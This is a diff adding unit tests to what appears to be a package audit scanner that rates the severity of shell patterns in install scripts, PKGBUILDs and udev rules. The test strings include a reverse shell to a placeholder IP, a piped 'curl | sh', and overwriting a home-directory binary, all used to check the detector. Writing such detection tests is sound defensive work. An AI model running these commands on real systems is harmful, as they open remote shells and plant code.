@@ -173,5 +173,40 @@ void run_audit_calibration_tests(void)
            "exec pattern in unit file stays CRITICAL");
     ASSERT(scan("notes.txt", "bash -i >& /dev/tcp/1.2.3.4/1 0>&1\n") == SEV_CRIT,
            "reverse shell in any file stays CRITICAL");
+    /* common false positives: quoted text, ~/ hints, *-modprobe wrappers, comments */
+    ASSERT(scan("x.install", "    echo \"==>> or ~/.app/share/roms\"\n") == SEV_WARN,
+           "quoted > in an echo is text");
+    {
+        Report q;
+        report_init(&q);
+        const char *t = "echo \"==>> ~/.app/share/data\"\n";
+        audit_scan_text(&q, "x.install", t, strlen(t));
+        bool bad = false;
+        for (size_t i = 0; i < q.n; i++)
+            if (strstr(q.f[i].msg, "writes into"))
+                bad = true;
+        ASSERT(!bad, "quoted >> is not a write");
+        report_free(&q);
+    }
+    ASSERT(scan("x.install", "echo \"$(curl -s x)\" >/dev/null\n") >= SEV_WARN,
+           "command substitution in echo is code");
+    ASSERT(scan("x.install", "echo \"$(sudo id)\"\n") == SEV_HIGH,
+           "substitution inside double quotes is not capped");
+    ASSERT(scan("x.sh", "XDG_CONFIG_HOME=${XDG_CONFIG_HOME:-~/.config}\n") == SEV_WARN,
+           "naming ~/.config is WARN");
+    ASSERT(scan("x.install", "cp evil /home/bob/.local/bin/ls\n") == SEV_HIGH,
+           "copying into a home directory is HIGH");
+    ASSERT(scan("x.install", "echo x > \"$HOME/.profile\"\n") == SEV_HIGH,
+           "redirect into $HOME is HIGH");
+    ASSERT(scan("PKGBUILD", "install -Dm755 foo-modprobe \"$pkgdir/usr/bin/x\"\n") == SEV_INFO,
+           "foo-modprobe is not modprobe");
+    ASSERT(scan("PKGBUILD", "install -Dm4755 x \"$pkgdir/usr/bin/x\"\n") == SEV_HIGH,
+           "install -m4755 is setuid");
+    ASSERT(scan("x.install", "  /sbin/modprobe evil\n") == SEV_HIGH, "real modprobe");
+    ASSERT(scan("99-foo.rules", "# foo-modprobe should not be invoked.\n# modprobe x\n") == SEV_INFO,
+           "comments are not code");
+    ASSERT(scan("x.install", "# curl x | sh\n") == SEV_WARN, "commented CRITICAL still shown");
+    ASSERT(scan("99-foo.rules", "KERNEL==\"foo\", RUN+=\"/usr/bin/foo-helper -u\"\n")
+           == SEV_WARN, "udev RUN is WARN");
     printf("audit calibration: ok\n");
 }
